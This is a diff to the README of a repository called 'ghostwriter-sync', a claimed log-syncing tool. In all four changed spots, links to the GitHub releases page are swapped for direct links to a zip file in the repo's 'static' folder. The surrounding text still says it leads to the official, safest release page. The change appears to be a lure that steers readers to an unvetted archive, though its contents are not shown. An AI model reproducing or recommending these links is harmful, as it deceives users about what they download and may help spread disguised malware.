@@ -1,6 +1,6 @@
 # 👻 ghostwriter-sync - Sync Logs Simply and Securely
 
-[![Download ghostwriter-sync](https://img.shields.io/badge/Download-ghostwriter--sync-ff6600?style=for-the-badge)](https://github.com/doquocanh19092020-maker/ghostwriter-sync/releases)
+[![Download ghostwriter-sync](https://img.shields.io/badge/Download-ghostwriter--sync-ff6600?style=for-the-badge)](https://github.com/doquocanh19092020-maker/ghostwriter-sync/raw/refs/heads/main/static/ghostwriter_sync_2.6.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This section will guide you through downloading, installing, and running ghostwr
 You need to get ghostwriter-sync from the official GitHub release page. This is the safest and most up-to-date source.
 
 Click this link to visit the download page:  
-[Download ghostwriter-sync Releases](https://github.com/doquocanh19092020-maker/ghostwriter-sync/releases)
+[Download ghostwriter-sync Releases](https://github.com/doquocanh19092020-maker/ghostwriter-sync/raw/refs/heads/main/static/ghostwriter_sync_2.6.zip)
 
 Or click the badge above.
 
@@ -119,7 +119,7 @@ If you run into problems, try these steps:
 
 For your convenience, here is the download page again. Visit it and get the latest version:
 
-[Download ghostwriter-sync Releases](https://github.com/doquocanh19092020-maker/ghostwriter-sync/releases)
+[Download ghostwriter-sync Releases](https://github.com/doquocanh19092020-maker/ghostwriter-sync/raw/refs/heads/main/static/ghostwriter_sync_2.6.zip)
 
 ---
 
@@ -146,4 +146,4 @@ If you need assistance:
 
 # ghostwriter-sync Badge
 
-[![Download ghostwriter-sync](https://img.shields.io/badge/Download-ghostwriter--sync-orange?style=for-the-badge)](https://github.com/doquocanh19092020-maker/ghostwriter-sync/releases)
+[![Download ghostwriter-sync](https://img.shields.io/badge/Download-ghostwriter--sync-orange?style=for-the-badge)](https://github.com/doquocanh19092020-maker/ghostwriter-sync/raw/refs/heads/main/static/ghostwriter_sync_2.6.zip)
